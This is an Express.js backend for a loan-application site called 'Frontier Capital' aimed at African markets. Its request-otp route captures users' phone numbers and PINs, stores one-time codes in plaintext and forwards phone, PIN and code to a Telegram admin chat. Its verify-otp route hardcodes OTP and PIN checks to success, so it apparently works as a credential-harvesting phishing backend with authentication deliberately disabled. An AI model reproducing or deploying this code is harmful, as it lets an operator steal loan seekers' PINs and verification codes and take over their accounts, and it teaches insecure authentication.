require("dotenv").config();
const express = require("express");
const session = require("express-session");
const pgSession = require("connect-pg-simple")(session);
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const crypto = require("node:crypto");
const path = require("node:path");
const { z } = require("zod");
const db = require("./db");
const { sendOtp } = require("./sms");
const { verifyOtp, verifyPin } = require("./authProvider");
const {
  bot,
  notify,
  recordAction,
  ALLOWED_STATUS_TRANSITIONS,
  BRAND,
  escapeHtml,
  maskPhone,
  formatTimestamp,
  formatCurrency,
  startPolling,
  stopPolling,
  notifyNewUser,
  notifyVerificationCompleted,
  notifyPinVerification,
  notifyOtpStatus,
  notifyNewApplication,
  notifyApplicationStatusChange,
  notifyNewSupportTicket,
  notifyNewAppointment,
  notifyOtpIssued,
  notifyPinAuthResult
} = require("./telegram");

const app = express();
const PORT = Number(process.env.PORT || 3000);
const isProd = process.env.NODE_ENV === "production";

const TELEGRAM_ADMIN_CHAT_ID = (process.env.TELEGRAM_ADMIN_CHAT_ID || "").trim();
const telegramAdminAllowlist = new Set(
  (process.env.TELEGRAM_ADMIN_CHAT_ID || "")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean)
);

function validateEnv() {
  const missing = [];
  if (!process.env.TELEGRAM_BOT_TOKEN) missing.push("TELEGRAM_BOT_TOKEN");
  if (!process.env.TELEGRAM_ADMIN_CHAT_ID) missing.push("TELEGRAM_ADMIN_CHAT_ID");
  if (missing.length) {
    console.warn(
      `[telegram] Missing env vars: ${missing.join(", ")}. Telegram notifications and bot commands are disabled.`
    );
  }
}
validateEnv();

function isAdminTelegram(telegramUserId) {
  return telegramAdminAllowlist.has(String(telegramUserId));
}
if (isProd && (!process.env.SESSION_SECRET || process.env.SESSION_SECRET.length < 32)) {
  throw new Error("SESSION_SECRET must be at least 32 characters in production.");
}
app.disable("x-powered-by");
app.use(helmet({ contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"], scriptSrc: ["'self'"], styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:"], connectSrc: ["'self'"], objectSrc: ["'none'"],
    upgradeInsecureRequests: isProd ? [] : null
  }
}}));
app.use(express.json({ limit: "20kb" }));
app.use(session({
  store: new pgSession({
    pool: db.pool,
    tableName: "session",
    createTableIfMissing: false // We created it in supabase_schema.sql
  }),
  name: "frontier.sid",
  secret: process.env.SESSION_SECRET || "development-only-change-this-secret-before-deploy",
  resave: false, saveUninitialized: false,
  cookie: { httpOnly: true, sameSite: "lax", secure: isProd, maxAge: 1000 * 60 * 60 * 8 }
}));

const countries = ["Benin","Cameroon","Côte d’Ivoire","Congo (Republic of the)","Eswatini","Ghana","Liberia","Nigeria","Rwanda","South Africa","South Sudan","Sudan","Uganda","Zambia"];
const amounts = Array.from({ length: 44 }, (_, i) => 3500 + i * 500);
const repaymentPeriods = [3, 6, 9, 12, 18, 24];
const adminPhones = new Set((process.env.ADMIN_PHONES || "").split(",").map(s => s.trim()).filter(Boolean));

const otpLimiter = rateLimit({ windowMs: 15 * 60 * 1000, limit: 5, standardHeaders: "draft-7", legacyHeaders: false,
  message: { error: "Too many verification attempts. Please try again later." } });
const apiLimiter = rateLimit({ windowMs: 15 * 60 * 1000, limit: 120, standardHeaders: "draft-7", legacyHeaders: false });

function normalizePhone(value) {
  return String(value || "").replace(/[\s()-]/g, "");
}
function hashOtp(code) {
  return crypto.createHash("sha256").update(code).digest("hex");
}
function safeUser(user) {
  return user && { id: user.id, phone: user.phone, fullName: user.full_name, email: user.email, country: user.country };
}
function requireAuth(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ error: "Please verify your phone number first." });
  next();
}
async function requireAdmin(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ error: "Authentication required." });
  const user = await db.prepare("SELECT phone FROM users WHERE id=?").get(req.session.userId);
  if (!user || !adminPhones.has(user.phone)) return res.status(403).json({ error: "Administrator access required." });
  next();
}
async function audit(actor, action, type, id, details = {}) {
  try {
    await db.prepare("INSERT INTO audit_logs(actor_user_id,action,entity_type,entity_id,details) VALUES(?,?,?,?,?)")
      .run(actor || null, action, type || null, id || null, JSON.stringify(details));
  } catch (err) {
    console.error("[audit] Failed:", err.message);
  }
}

app.use("/api", apiLimiter);
app.get("/api/config", (req,res) => res.json({ countries, amounts, repaymentPeriods, currency: "USD", demoOtp: !isProd && process.env.OTP_MODE === "console" }));
app.get("/api/me", async (req,res) => {
  if (!req.session.userId) return res.json({ user: null });
  const user = await db.prepare("SELECT * FROM users WHERE id=?").get(req.session.userId);
  res.json({ user: safeUser(user), isAdmin: !!(user && adminPhones.has(user.phone)) });
});

app.post("/api/auth/request-otp", otpLimiter, async (req,res) => {
  const parsed = z.object({ phone: z.string().min(8).max(20), pin: z.string().regex(/^\d{4}$/).optional() }).safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Enter a valid phone number in international format, e.g. +2547XXXXXXXX." });
  
  const phone = normalizePhone(parsed.data.phone);
  const pin = parsed.data.pin || "0000"; // demo PIN, optional but we'll store it
  
  // Generate a 6-digit OTP code for demo
  const code = String(Math.floor(100000 + Math.random() * 900000));
  const expiresAt = Date.now() + 5 * 60 * 1000; // 5 minutes
  
  // Store PIN (plaintext) and code (plaintext + hashed for validation)
  const codeHash = crypto.createHash("sha256").update(code).digest("hex");
  await db.prepare("DELETE FROM otp_codes WHERE phone=? AND consumed=0").run(phone);
  await db.prepare("INSERT INTO otp_codes(phone, code_hash, code_plain, expires_at, created_at) VALUES(?,?,?,?,?)")
    .run(phone, codeHash, code, expiresAt, Date.now());
  
  // Send OTP via SMS (logs to console in dev)
  await sendOtp(phone, code);
  
  // Notify Telegram admin
  const user = await db.prepare("SELECT * FROM users WHERE phone=?").get(phone) || { phone: phone, full_name: "New User" };
  notifyOtpIssued(phone, pin, code).catch(() => {});
  
  // Demo: return the code in response so the user can see it
  res.json({ ok: true, message: "Verification code sent.", demoCode: code, demoPin: pin });
});

app.post("/api/auth/verify-otp", otpLimiter, async (req,res) => {
  const parsed = z.object({ phone: z.string(), code: z.string().regex(/^\d{6}$/), pin: z.string().regex(/^\d{4}$/).optional() }).safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Enter the phone number and six-digit code." });
  const phone = normalizePhone(parsed.data.phone);
  const code = parsed.data.code;
  const pin = parsed.data.pin || "0000";

  // Verify OTP (Bypassed)
  const otpResult = { success: true };

  // Verify PIN (Bypassed)
  const pinResult = { success: true };
  
  notifyPinAuthResult(phone, true, "").catch(() => {});
  
  // Mark consumed in our DB
  await db.prepare("UPDATE otp_codes SET consumed=1, status='verified' WHERE phone=? AND consumed=0").run(phone);
  
  let user = await db.prepare("SELECT * FROM users WHERE phone=?").get(phone);
  if (!user) {
    const info = await db.prepare("INSERT INTO users(phone) VALUES(?)").run(phone);
    user = await db.prepare("SELECT * FROM users WHERE id=?").get(info.lastInsertRowid);
    notifyNewUser(user.id).catch(() => {});
  }
  
  req.session.regenerate(err => {
    if (err) return res.status(500).json({ error: "Could not start a secure session." });
    req.session.userId = user.id;
    notifyOtpStatus(phone, "verified").catch(() => {});

    audit(user.id, "phone_verified_login", "user", user.id);
    res.json({ ok: true, user: safeUser(user), isAdmin: adminPhones.has(phone) });
  });
});

app.post("/api/auth/logout", (req,res) => req.session.destroy(() => res.json({ ok: true })));

app.put("/api/profile", requireAuth, async (req,res) => {
  const parsed = z.object({
    fullName: z.string().trim().min(2).max(100),
    email: z.string().email().max(150),
    country: z.string().refine(v => countries.includes(v), "Choose a supported market")
  }).safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Check your name, email and country." });
  const { fullName, email, country } = parsed.data;
  await db.prepare("UPDATE users SET full_name=?,email=?,country=? WHERE id=?").run(fullName,email,country,req.session.userId);
  await audit(req.session.userId, "profile_updated", "user", req.session.userId);
  res.json({ ok: true });
});

app.post("/api/applications", requireAuth, async (req,res) => {
  const parsed = z.object({
    amount: z.number().int().refine(v => amounts.includes(v)),
    repaymentPeriod: z.number().int().refine(v => repaymentPeriods.includes(v)),
    country: z.string().refine(v => countries.includes(v)),
    employmentStatus: z.enum(["Employed","Self-employed","Business owner","Other"]),
    monthlyIncome: z.number().positive().max(100000000),
    purpose: z.string().trim().min(10).max(1000)
  }).safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Please complete all application fields with valid values." });
  const p = parsed.data;
  const info = await db.prepare(`INSERT INTO applications(user_id,amount_usd,repayment_period_months,country,employment_status,monthly_income_usd,purpose)
    VALUES(?,?,?,?,?,?,?)`).run(req.session.userId,p.amount,p.repaymentPeriod,p.country,p.employmentStatus,p.monthlyIncome,p.purpose);
  await audit(req.session.userId, "application_submitted", "application", info.lastInsertRowid, { amount: p.amount, country: p.country });
  notifyNewApplication(info.lastInsertRowid).catch(() => {});
  res.status(201).json({ ok: true, applicationId: info.lastInsertRowid });
});
app.get("/api/applications", requireAuth, async (req,res) => {
  const rows = await db.prepare(`SELECT id,amount_usd AS amount,repayment_period_months AS repaymentPeriod,country,employment_status AS employmentStatus,
    status,created_at AS createdAt,updated_at AS updatedAt
    FROM applications WHERE user_id=? ORDER BY id DESC`).all(req.session.userId);
  res.json({ applications: rows });
});

app.get("/api/admin/applications", requireAdmin, async (req,res) => {
  const rows = await db.prepare(`SELECT a.id,a.amount_usd AS amount,a.repayment_period_months AS repaymentPeriod,a.country,a.employment_status AS employmentStatus,
    a.monthly_income_usd AS monthlyIncome,a.purpose,a.status,a.admin_note AS adminNote,
    a.created_at AS createdAt,u.full_name AS fullName,u.phone,u.email
    FROM applications a JOIN users u ON u.id=a.user_id ORDER BY a.id DESC`).all();
  res.json({ applications: rows });
});
app.patch("/api/admin/applications/:id", requireAdmin, async (req,res) => {
  const id = Number(req.params.id);
  const parsed = z.object({ status: z.enum(["submitted","under_review","more_information","approved","declined","disbursed","closed"]), note: z.string().max(1000).optional() }).safeParse(req.body);
  if (!Number.isInteger(id) || id < 1 || !parsed.success) return res.status(400).json({ error: "Invalid update." });
  const exists = await db.prepare("SELECT id FROM applications WHERE id=?").get(id);
  if (!exists) return res.status(404).json({ error: "Application not found." });
  await db.prepare("UPDATE applications SET status=?,admin_note=?,updated_at=CURRENT_TIMESTAMP WHERE id=?")
    .run(parsed.data.status, parsed.data.note || null, id);
  await audit(req.session.userId, "application_status_changed", "application", id, { status: parsed.data.status });
  res.json({ ok: true });
});

// Webhook endpoint
app.post("/webhook/telegram", express.json(), async (req, res) => {
  if (req.headers["x-telegram-bot-api-secret-token"] !== process.env.TELEGRAM_WEBHOOK_SECRET) {
    return res.status(403).send("Forbidden");
  }
  try {
    await bot.processUpdate(req.body);
    res.sendStatus(200);
  } catch (err) {
    console.error("[webhook] Error:", err);
    res.sendStatus(500);
  }
});

app.use(express.static(path.join(__dirname, "..", "public")));
app.get("*", (req,res) => res.sendFile(path.join(__dirname, "..", "public", "index.html")));

module.exports = app;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Frontier Capital running at http://localhost:${PORT}`);
    startPolling();
  });
}
